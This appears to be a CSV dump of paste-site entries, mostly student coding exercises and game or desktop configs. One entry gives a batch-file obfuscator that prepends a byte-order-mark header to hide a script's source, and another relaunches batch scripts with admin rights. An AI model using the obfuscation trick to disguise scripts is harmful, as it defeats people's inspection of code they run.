id,title,username,language,date,content
vSaWQnFu,Untitled,MisterQuirk,Python,Saturday 13th of April 2024 10:16:09 AM CDT,"#Task 1

def sum_numbers(*numbers):
    return sum(numbers)

#Task 2

def print_kwargs(**kwargs):
    for line in kwargs:
        print(f'{line}: {kwargs[line]}')


#Task 3

def filter_by_length(min_length, *args):
    ans = list()
    for line in args:
        if len(line) >= min_length:
            ans.append(line)
    return ans

#Task 4

def calculate_total_price(cost, **kwargs):
    total_discount = 0
    for item in kwargs:
        total_discount += kwargs[item]
    return cost - cost * (total_discount * 0.01)

#Task 5

def custom_print(*args, **kwargs):
    endline = kwargs.get('end', '\n')
    separator = kwargs.get('sep', ' ')

    arr = list()

    for line in args:
        arr.append(str(line))

    for key, item in kwargs.items():
        if key != 'sep' and key != 'end':
            arr.append(f'{key} = {item}')

    print(separator.join(arr), end=endline)
"
weLeRnRP,system,AlewAlow,Lua,Saturday 13th of April 2024 09:58:55 AM CDT,"local ReplicatedStorage = game:GetService(""ReplicatedStorage"")

local Matter = require(ReplicatedStorage.Shared.Libs.Matter)
local Components = require(ReplicatedStorage.Shared.Components)

local function MoveTransforms(world, state)
	for id, transform, velocity in world:query(Components.Transform, Components.Velocity):without(Components.NonShared) do
		world:insert(id, transform:patch({
			Position = transform.Position + velocity.Velocity * Matter.useDeltaTime()
		}))
	end
end

return MoveTransforms"
zzAbAHtQ,Mad,Unknown_No_1,PHP,Saturday 13th of April 2024 09:54:27 AM CDT,2024LastInternetYearWW3
JwPWwGYD,SFWBar config,daddy_jones,CSS,Saturday 13th of April 2024 09:49:21 AM CDT,"# Override gtk theme
# theme = ""Adwaita-dark""
# Override gtk icon theme
# IconTheme = ""Adwaita""

Set Term = ""alacritty""

# Window Placer
placer {
  xorigin = 5  # place the first window at X% from the left
  yorigin = 5  # place the first window at X% from the top
  xstep = 5    # step by X% of desktop horizontally
  ystep = 5    # step by X% of desktop vertically
  children = true
}

# Task Switcher
switcher {
  interval = 700
  icons = true
  labels = false
  cols = 5
}

function(""SfwbarInit"") {
  SetBarId ""bar-0""
  SetLayer ""top""
  SetExclusiveZone ""auto""
  SetMonitor ""eDP-1""
  SetBarSize ""80%""
#  SetBarSize ""bar1"",""800"" 
  SetMirror ""*""
}

include(""winops.widget"")

# Panel layout

layout ""sfwbar"" {
 ##  include(""startmenu.widget"")
  include(""showdesktop.widget"")

  taskbar {
    rows = 1
    group = true
    group cols = 1
    group style = ""taskbar_group""
    group labels = true
    group icons = true
    icons = true
    labels = false
    action[3] = Menu ""winops""
    ## filter=output
  }

  label { css = ""* { -GtkWidget-hexpand: true; min-height: 28px; }"" }

  tray {
    rows = 1
  }

#  include(""battery-svg.widget"")
   include(""bluez.widget"")
# include(""rfkill-wifi.widget"")
# include(""rfkill-bt.widget"")
  include(""network-module.widget"")
# Select pulse-module or alsa-module based on your sound configuration
  include(""pulse-module.widget"")
# include(""alsa-module.widget"")
   include(""mpd-intmod.widget"")
   include(""sway-lang.widget"")

  Label {
  Value = Str(NetStat(""rxrate"") / 1024 / 1024) + "" Mbps""
  Css = ""* { min-width: 100px; }""
  }

  grid {
    css = ""* { -GtkWidget-direction: bottom; padding: 5px; padding-left: 0px; }""
    label {
      value = Time(""%k:%M"")
      style =""clock""
    }
    label {
      value = Time(""%x"")
      style =""clock""
    }
  }
}

#CSS
@define-color theme_bg_color #353231;
@define-color theme_fg_color #d1d1d1;
@define-color theme_text_color #d1d1d1;
@define-color borders #777777;

window {
  -GtkWidget-direction: bottom;
  background-color: #353231;
}

label {
  font: 12px sans;
  color: @theme_text_color;
  text-shadow: none;
}

button,
button image {
  outline-style: none;
  box-shadow: none;
  background-image: none;
  border-image: none;
}

window#taskbar_group {
  background-color: RGBA(0.2,0.2,0.2,0.5);
}

#hidden {
  -GtkWidget-visible: false;
}

button#taskbar_group_normal,
button#taskbar_group_normal:hover,
button#taskbar_group_active {
  margin: 0px;
  border: 0px;
  border-radius: 0px;
  -GtkWidget-valign: center;
}

button#taskbar_group_normal image,
button#taskbar_group_normal:hover image,
button#taskbar_group_active image {
  min-height: 30px;
  min-width: 30px;
  margin: 0px;
}

button#taskbar_group_active {
  background-color: #493B41;
}

button#taskbar_normal:hover,
button#taskbar_group_normal:hover,
button#taskbar_group_active:hover {
  background-color: #535353;
}

button#taskbar_normal grid {
  padding-right: 0px;
  margin-right: 0px;
  min-height: 0px;
}

button#taskbar_normal image,
button#taskbar_active image,
button#taskbar_normal:hover image {
  min-width: 18px;
  min-height: 18px;
}

button#taskbar_normal label,
button#taskbar_active label,
button#taskbar_normal:hover label {
  -GtkWidget-hexpand: true;
  -GtkWidget-halign: start;
  padding: 0px 7px 0px 0px;
}

button#taskbar_normal,
button#taskbar_active,
button#taskbar_normal:hover {
  border-radius: 0;
  border: 0px;
  box-shadow: none;
  -GtkWidget-hexpand: false;
  -GtkWidget-vexpand: false;
  min-height: 0px;
  background-color: #535353;
}

button#taskbar_active {
  background-color: #646464;
}


button#taskbar_normal:hover {
  background-color: #646464;
}

#menu_item,
#menu_item *,
#menu_item image,
#menu_item label {
  -GtkWidget-halign: start;
  color: white;
}

#menu_item image {
  min-width: 16px;
  min-height: 16px;
  padding-right: 2px;
}

menu {
  background-color: #353231;
}

menu arrow {
  background: none;
}

button#pager_normal,
button#pager_visible,
button#pager_focused {
  padding: 0px 5px 0px 5px;
  border-radius: 0;
}

button#pager_focused {
  background-color: #bbddff;
}

button#pager_preview {
  border-radius: 0;
  border-color: #000000;
  border-width: 0.25mm;
  color: #777777;
  min-width: 5cm;
  min-height: 2.8125cm;
}

grid#pager {
  outline-color: #000000;
  outline-style: dashed;
  outline-width: 0.25mm;
}

grid#switcher_active image,
grid#switcher_active {
  min-width: 50px;
  min-height: 50px;
  padding: 5px;
  background-color: #646464;
  border-radius: 5px;
  -GtkWidget-hexpand: true;
}

grid#switcher_normal image,
grid#switcher_normal {
  min-width: 50px;
  min-height: 50px;
  padding: 5px;
  -GtkWidget-direction: right;
  -GtkWidget-hexpand: true;
}

window#switcher { 
  border: 1px solid @borders;
  border-radius: 5px; 
  padding: 5px; 
  -GtkWidget-hexpand: true;
}

grid#switcher { 
  border-radius: 5px;
  padding: 5px;
  -GtkWidget-hexpand: true;
}

button#tray_active,
button#tray_passive,
button#tray_attention {
  border: 0px;
  margin: 0px;
  border-radius: 0px;
}

button#tray_passive {
  -GtkWidget-visible: false;
}

button#tray_active label,
button#tray_passive label,
button#tray_attention label {
  padding: 1px;
  color: @theme_text_color;
}

button#tray_active image,
button#tray_passive image,
button#tray_attention image {
  min-width: 18px;
  min-height: 18px;
  -GtkWidget-vexpand: true;
  -GtkWidget-halign: center;
  -GtkWidget-valign: center;
}

label#clock {
  color: @theme_text_color;
  -GtkWidget-vexpand: true;
  -GtkWidget-valign: center;
  font-size: 12px;
}

label#sway_lang {
  margin-left: 3px;
  margin-right: 5px;
}

grid#layout {
  -GtkWidget-direction: right;
}

button#module,
button#showdesktop,
button#startmenu {
  margin: 0px;
  border: 0px;
  border-radius: 0px;
  min-height: 18px;
  min-width: 18px;
  -GtkWidget-valign: center;
  -GtkWidget-vexpand: true;
  padding: 0px 3px 0px 3px;
}

button#startmenu,
button#showdesktop {
  min-width: 24px;
  min-height: 24px;
}

* {
  color: #ffffff;
}
"
Y9TvHnJd,chunkMiner,mathiaas,Lua,Saturday 13th of April 2024 09:08:54 AM CDT,"-- todo when low fuel lvl: refuel
-- deal with multiple chunks

local args = {...}
local starting_height = tonumber(args[1])
--local chunks_to_mine = tonumber(args[2])
local chunk_size = 32
local minimum_height = 8

if #args < 1 then
    --print(""Usage: chunkMiner <starting height> <chunks to mine>"")
    print(""Usage: chunkMiner <starting height>"")
    return
end

assert(loadfile(""utils""))()
assert(loadfile(""movement""))()

local items = {
    end_chest = ""EnderStorage:enderChest""
}

local function init()
    local ender_chest_present = false
    local required_fuel = chunk_size * ((starting_height - minimum_height) * 2)

    if turtle.getFuelLevel() < required_fuel then
        print(""Required fuel: "" .. required_fuel)
        print(""Current fuel: "" .. turtle.getFuelLevel())
        print(""Not enough fuel to start... Hold ctrl + t to terminate"")
        while true do sleep(100) end
    end


    while not ender_chest_present do
        for k,v in pairs(getInventory()) do
            if v.name == items.end_chest then
                shell.run(""clear"")
                ender_chest_present = true
                break
            end
        end
        print(""Put ender chest in inventory"")
        sleep(1)
    end
end

local function ender_deposit()
    local inventory = getInventory()
    if #inventory < 10 then
        return false
    end

    for k, v in pairs(inventory) do
        if v.name == items.end_chest then
            turtle.select(v.slot)
            turtle.digUp()
            turtle.placeUp()
            break
        end
    end

    for k, v in pairs(inventory) do
        if v.name ~= items.end_chest then
            turtle.select(v.slot)
            turtle.dropUp()
        end
    end

    turtle.digUp()
end


local function mine(direction)
    direction = direction or ""front""
    local detect = turtle.detect
    local dig = turtle.dig

    if direction == ""up"" then
        detect = turtle.detectUp
        dig = turtle.digUp
    elseif direction == ""down"" then
        detect = turtle.detectDown
        dig = turtle.digDown
    end

    while detect() do dig() end

    ender_deposit()
end


local function mine_row(steps)
    for _ = 1, steps do
        mine()
        f()
    end
end


local function handle_turn(layer, idx)
    local even_layer = layer % 2 == 0
    local turn = (idx % 2 == 1) ~= even_layer and l or r
    turn()
    mine()
    f()
    turn()
end


local function mine_layer(layer)
    for idx = 1, chunk_size do
        mine_row(chunk_size - 1)
        if idx ~= chunk_size then
            handle_turn(layer, idx)
        else
            l(2)
        end
    end
end


local function mine_cube(starting_height)
    chunks_to_mine = chunks_to_mine or 1
    starting_height = starting_height - minimum_height

    init()

    for layer = 1, starting_height do
        mine_layer(layer)
        if layer ~= starting_height then
            mine(""down"")
            d()
        end
    end
    u(starting_height)
end


mine_cube(starting_height)"
QkUQJNmx,client side replication part after edit,AlewAlow,Lua,Saturday 13th of April 2024 09:05:13 AM CDT,"local ReplicatedStorage = game:GetService(""ReplicatedStorage"")

local Components = require(ReplicatedStorage.Shared.Components)

local remoteEvent = ReplicatedStorage:WaitForChild(""MatterRemote"")

local function SetupReplication(world, state)
	local function debugPrint(...)
		if state.debugEnabled then
			print(""Replication>"", ...)
		end
	end
	
	remoteEvent.OnClientEvent:Connect(function(entities)
		for entityId, componentMap in entities do
			local entityId = tonumber(entityId)
			local exists = world:contains(entityId)
			
			if exists and next(componentMap) == nil then
				world:despawn(entityId)
				debugPrint(string.format(""Despawn %s"", entityId))
				continue
			end

			local componentsToInsert = {}
			local componentsToRemove = {}

			local insertNames = {}
			local removeNames = {}

			for name, container in componentMap do
				if container.data then
					table.insert(componentsToInsert, Components[name](container.data))
					table.insert(insertNames, name)
				else
					table.insert(componentsToRemove, Components[name])
					table.insert(removeNames, name)
				end
			end

			if not exists then
				-- the ""NonShared"" is used for shared systems that run on both sides
				-- by filtering out by default entities that were created on the server and replicated to the client
				-- which leads to shared systems running for the entity on the same side they were created on
				-- an example of a shared system is a system of mine that handles checking collisions
				-- by doing the same calculations each frame and storing the results which are a table of ids
				-- in a component, which would have been hard to do because of how ids are not the same on
				-- both sides so entities created on the server would have replicated false ids compared to the client
				-- but thanks to this change they work well
				world:spawnAt(entityId, Components.NonShared(), unpack(componentsToInsert))
				
				debugPrint(
					string.format(""Spawn %s with %s"", entityId, table.concat(insertNames, "",""))
				)
			else
				if #componentsToInsert > 0 then
					world:insert(entityId, unpack(componentsToInsert))
				end
			
				if #componentsToRemove > 0 then
					world:remove(entityId, unpack(componentsToRemove))
				end

				debugPrint(
					string.format(
						""Modify %s adding %s, removing %s"",
						entityId,
						if #insertNames > 0 then table.concat(insertNames, "", "") else ""nothing"",
						if #removeNames > 0 then table.concat(removeNames, "", "") else ""nothing""
					)
				)
			end
		end
	end)
end

return SetupReplication
"
a3n2xuM2,Run Batch Script As Admin [VBS],sofaygo,VBScript,Saturday 13th of April 2024 08:52:01 AM CDT,"[[-]] VBS/Batch - Run Script As Admin [[-]]
 
VBS File:
Set objShell = CreateObject(""Shell.Application"")
Set objShellShell = CreateObject(""WScript.Shell"")
strScriptPath = objShellShell.CurrentDirectory & ""\replace with your file name.bat""
 
objShell.ShellExecute ""cmd.exe"", ""/c """""" & strScriptPath & """""""", """", ""runas"", 1
 
Save this as RunAsAdmin.vbs. Then, create a batch script to run this.
 
For example: 
@echo off
RunAsAdmin.vbs >nul
exit"
0Xate4Q3,Script Obfuscator (Batch File),sofaygo,Batch,Saturday 13th of April 2024 08:43:44 AM CDT,"[[-]] Batch Obfuscator Code [[-]]

Batch Obfuscator/Deobfuscator:

Just drag the batch script you want to obfuscate to the obfuscate.bat

To deobfuscate the file, drag the obfuscated batch script to it.

[[-]] Code [[-]]

Obfuscate:
@echo off
REM Code to obfuscate the file
if ""%~1""=="""" exit /b
if /i ""%~x1"" neq "".bat"" if /i ""%~x1"" neq "".cmd"" exit /b
for /f %%i in (""certutil.exe"") do if not exist ""%%~$path:i"" (
  echo CertUtil.exe not found.
  pause
  exit /b
)
>""temp.~b64"" echo(//4mY2xzDQo=
certutil.exe -f -decode ""temp.~b64"" ""%~n1___%~x1""
del ""temp.~b64""
copy ""%~n1___%~x1"" /b + ""%~1"" /b

Deobfuscator:
@echo off
REM Deobfuscates the file that is obfuscated.
setlocal
if ""%~1""=="""" exit /b
if /i ""%~x1"" neq "".bat"" if /i ""%~x1"" neq "".cmd"" exit /b
<""%~1"" ((for /l %%N in (1 1 8) do pause)>nul&findstr ""^"">""%~n1__%~x1"")

"
TkP4UHhR,Untitled,MisterQuirk,Python,Saturday 13th of April 2024 07:38:41 AM CDT,"x = open('my_text.txt')

#Task 1
def string_1(x):
    with open(x,'r') as file:
        data = file.read()
    return data

#Task 2
def string_2(x):
    with open(x,'r') as file:
        data = file.readline()
    return data

#Task 3
def string_3(x):
    with open(x,'r') as file:
        data = file.readlines()
    return data

#Task 4
def string_4(x):
    with open(x,'r') as file:
        data = file.read().split('\n')
    return data

#Task 5
def string_5(x):
    with open(x,'r') as file:
        for line in file:
            print(line, end='')

#Task 6
def string_6(x):
    with open(x,'r') as file:
        st = ' '.join(file.readlines()).replace('\n', '')
        return st

#Task 7
def string_7(x):
    return x.strip()

#Task 8
def string_8(string):
    return string.strip('!?.')

#Task 9
def string_9(string):
    with open(string,'w') as file:
        file.write(string)

#Task 10
def string_10(string):
    with open(string,'w') as file:
        file.write(string + '\n')

#Task 11
def string_11(string):
    with open(string,'w') as file:
        file.writelines(x)

#Task 12
def string_12(x1, x2):
    with open(x1, 'r') as file1:
        with open(x2, 'a') as file2:
            for line in file1:
                print(line, file=file2)

#Task 13

def string_13(x1, x2):
    with open(x1, 'r') as file1:
        with open(x2, 'a') as file2:
            for line in file1:
                line_1 = line.strip()
                if line_1.startswith('hello') and line_1.endswith('world'):
                    file2.write(line)

#Task 14

def string_14(name):
    solve = {}
    with open(name, 'r') as file:
        data = file.readlines()[:1]
    for line in data:
        sp = line.split()
        solve[sp[0]] = (sp[1], sp[2])
    return solve
"
kCcDFDBa,Untitled,dllbridge,C,Saturday 13th of April 2024 07:25:49 AM CDT,"
#include<stdio.h>



void  Dog(int *c, int *q);




////////////////////////////////////////////////////////////
int main()
{
	
	int c = 14,
	    q = 20;   
	
    Dog(&c, &q);
    printf(""From main:\n"");
    printf(""addres c = %d \n"", &c);    
    printf("" c = %d \n"", c);
    printf("" q = %d \n"", q);    
}



///////////////////////////////////////////////////////////
void  Dog(int *c, int *q)  // c - это левая рука
{                          // q - правая рука 
	
      int a;               //  Стол
    
	  a = *c;              //  Положили на стол из левой руки
     *c = *q;              //  Из правой руки кладём торт в левую руку.    
     *q = a;               //  Правой рукой берём торт со стола
    
    printf(""From Dog:\n""  );
    printf(""addres c = %d \n"", c);    
    printf(""*c = %d \n"", *c);
    printf(""*q = %d \n"", *q);      

}



/*

#include<stdio.h>



void  Dog(int &c, int &q);




////////////////////////////////////////////////////////////
int main()
{
	
	int c = 14,
	    q = 20;   
	
    Dog(c, q);
    printf(""From main:\n"");
    printf(""addres c = %d \n"", &c);    
    printf("" c = %d \n"", c);
    printf("" q = %d \n"", q);    
}



///////////////////////////////////////////////////////////
void  Dog(int &c, int &q)  // c - это левая рука
{                        // q - правая рука 
	
      int a;             //  Стол
    
	  a = c;             //  Положили на стол из левой руки
      c = q;             //  Из правой руки кладём торт в левую руку.    
      q = a;             //  Правой рукой берём торт со стола
    
    printf(""From Dog:\n""  );
    printf(""addres c = %d \n"", &c);    
    printf("" c = %d \n"", c);
    printf("" q = %d \n"", q);      

}

*/













/*

#include<stdio.h>



void  Dog(int c, int q);




////////////////////////////////////////////////////////////
int main()
{
	
	int c = 14,
	    q = 20;   
	
    Dog(c, q);
    printf(""From main:\n"");
    printf("" c = %d \n"", c);
    printf("" q = %d \n"", q);    
}



///////////////////////////////////////////////////////////
void  Dog(int c, int q)  // c - это левая рука
{                        // q - правая рука 
	
      int a;             //  Стол
    
	  a = c;             //  Положили на стол из левой руки
      c = q;             //  Из правой руки кладём торт в левую руку.    
      q = a;             //  Правой рукой берём торт со стола
    
    printf(""From Dog:\n""  );
    printf("" c = %d \n"", c);
    printf("" q = %d \n"", q);      

}



*/


"
tTWVNgQ1,Untitled,35657,C++,Saturday 13th of April 2024 06:28:36 AM CDT,"
#include <iostream>

using namespace std;

void reverse(int number) {
    if (number < 10) {
        cout << number;
    }
    else {
        cout << number % 10; 
        reverse(number / 10); 
    }
}


int main() {
    setlocale(LC_ALL, ""ru"");

    reverse(7563);

}"
1jQ5GQ4Z,data895,TestGuy1,JSON,Saturday 13th of April 2024 06:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '31d170a67989e23e1449237783ebab3a83538db566211684bd1cf420278b11795ef3626b1166faecb31421c77c3beae8a3ffa116be63343f22aab1707336fcfc06e808c81859f10986fc2234255bf1d7522d23a2f1c0ea498d87f0ae114592ff77942eb6a90ef6575067dd7fd2e2a7c603d394aee6b1ad2e0e923a2c96822c13',
  otherdata: [
    'bb18558019fcaf8e4adfe6f0e1db784d',
    'd543db2a6496ccd8e1a6b4b2390b301a',
    '9b492a3bdc376cff963e4f3530f0115a',
    '98e458467c56af8b21bffbd3ee22cf9d',
    '40af9eefc069e55d188cf50853086531',
    '8867ea306bb72c49e2f0b0812612431e',
    '062b7bb9ca27a26806e3df0911140897',
    '2d81bfa8d5e2805d53666892f7fc5ef2'
  ]
}"
jPzBnkPE,Untitled,35657,C++,Saturday 13th of April 2024 05:55:40 AM CDT,"
#include <iostream>

using namespace std;

void tower(int n, char src, char dest, char temp) {
    if (n == 0) {
        return;
    }
    tower(n - 1, src, temp, dest);
    cout << n << "" "" << src << "" -> "" << dest << endl;
    tower(n - 1, temp, dest, src);
}


int main() {
    setlocale(LC_ALL, ""ru"");

    tower(3, 'A', 'C', 'B');

}"
kenKH2wj,06. Building,myrdok123,Java,Saturday 13th of April 2024 05:17:37 AM CDT,"package NestedLoops;

import java.util.Scanner;

public class P06Building {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);

             int floors = Integer.parseInt(scanner.nextLine());
             int rooms = Integer.parseInt(scanner.nextLine());

        for (int i = floors; i >= 1 ; i--) {

            for (int j = 0; j < rooms; j++) {

                if (i == floors){
                    System.out.printf(""L%d%d "", i, j);
                } else if (i % 2 == 0) {
                    System.out.printf(""O%d%d "", i, j);
                }else {
                    System.out.printf(""A%d%d "", i, j);
                }

            }

            System.out.println();

        }
    }
}
"
J3P2T0j4,05. Travelling,myrdok123,Java,Saturday 13th of April 2024 05:16:42 AM CDT,"package NestedLoops;

import java.util.Scanner;

public class P05Travelling {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);

        String destination = scanner.nextLine();

        while (!destination.equals(""End"")){
            double neededMoney = Double.parseDouble(scanner.nextLine());

            double savedMoney = 0;
            while (neededMoney > savedMoney){
                double currentMoney = Double.parseDouble(scanner.nextLine());
                savedMoney += currentMoney;
            }

            System.out.printf(""Going to %s!%n"", destination);

            destination = scanner.nextLine();
        }


    }
}
"
HTpunDQN,04. Sum of Two Numbers,myrdok123,Java,Saturday 13th of April 2024 05:16:16 AM CDT,"package NestedLoops;

import java.util.Scanner;

public class P04SumOfTwoNumbers {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);

        int firstNumber = Integer.parseInt(scanner.nextLine());
        int secondNumber = Integer.parseInt(scanner.nextLine());
        int magicNumber = Integer.parseInt(scanner.nextLine());

        int countCombination = 0;
        boolean flag = false;

        for (int first = firstNumber; first <= secondNumber ; first++) {

            for (int second = firstNumber; second <= secondNumber ; second++) {
                countCombination++;
                int currentCombination = first + second;

                if (currentCombination == magicNumber){
                    System.out.printf(""Combination N:%d (%d + %d = %d)"", countCombination, first, second, magicNumber);
                    flag = true;
                    break;
                }

            }

            if(flag){
                break;
            }

        }
        if(!flag){
            System.out.printf(""%d combinations - neither equals %d"", countCombination, magicNumber);
        }
    }
}
"
cqcygGqU,03. Combinations,myrdok123,Java,Saturday 13th of April 2024 05:15:44 AM CDT,"package NestedLoops;

import java.util.Scanner;

public class P03Combinations {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);

        int number = Integer.parseInt(scanner.nextLine());

        int countCombinations = 0;

        for (int x1 = 0; x1 <= number; x1++) {

            for (int x2 = 0; x2 <= number; x2++) {

                for (int x3 = 0; x3 <= number; x3++) {

                    int currentCombination = x1 + x2 + x3;

                    if (currentCombination == number){

                        countCombinations++;

                    }

                }
            }

        }

        System.out.println(countCombinations);


    }
}
"
pHTmh1fA,02. Multiplication Table,myrdok123,Java,Saturday 13th of April 2024 05:14:58 AM CDT,"package NestedLoops;

public class P02MultiplicationTable {

    public static void main(String[] args) {


        for (int firstMultiplier = 1; firstMultiplier <= 10; firstMultiplier++) {

            for (int secondMultiplier = 1; secondMultiplier <= 10 ; secondMultiplier++) {

                System.out.printf(""%d * %d = %d%n"", firstMultiplier, secondMultiplier, firstMultiplier * secondMultiplier );

            }

        }

    }
}
"
Wdg7d8gD,01. Clock,myrdok123,Java,Saturday 13th of April 2024 05:14:32 AM CDT,"package NestedLoops;


public class P01Clock {

    public static void main(String[] args) {

        for (int hours = 0; hours <= 23; hours++) {

            for (int minutes = 0; minutes <= 59; minutes++) {

                System.out.printf(""%d:%d%n"", hours, minutes);

            }

        }

    }
}
"
hbiJCZee,3.LoadMeals,Silviya7,JavaScript,Saturday 13th of April 2024 05:09:51 AM CDT,"const baseURL='http://localhost:3030/jsonstore/tasks/';

const BtnLoadMeals= document.getElementById('load-meals');
const BtnAddMeal=document.getElementById('add-meal');
const ElementList= document.getElementById('list');

const Elementfood= document.getElementById('food');
const Elementtime= document.getElementById('time');
const Elementcalories= document.getElementById('calories');


const LoadMelas=
BtnLoadMeals.addEventListener('click',async ()=>{
    //Fetch all meals
    const response=await fetch(baseURL);
    const data= await response.json();
    console.log(Object.values(data));
    
    ElementList.innerHTML='';

    for (const meal of Object.values(data)) {        
        const mealBtndiv= document.createElement('div');
        mealBtndiv.id='meal-buttons';

        const BtnChange=document.createElement('button');
        BtnChange.classList.add('change-meal');
        BtnChange.textContent='Change';

        const BtnDelete=document.createElement('button');
        BtnDelete.classList.add('delete-meal');
        BtnDelete.textContent='Delete';

        mealBtndiv.appendChild(BtnChange);
        mealBtndiv.appendChild(BtnDelete);

        const Elementh1=document.createElement('h2');
        Elementh1.textContent= meal.food;
        const Elementhtime3=document.createElement('h3');
        Elementhtime3.textContent= meal.time;
        const Elementhcalories3=document.createElement('h3')
        Elementhcalories3.textContent= meal.calories;

        const divMeal= document.createElement('div');
        divMeal.classList.add('meal');
        divMeal.appendChild(Elementh1);
        divMeal.appendChild(Elementhtime3);
        divMeal.appendChild(Elementhcalories3);
        divMeal.appendChild(mealBtndiv);

        ElementList.appendChild(divMeal);

    }

});
"
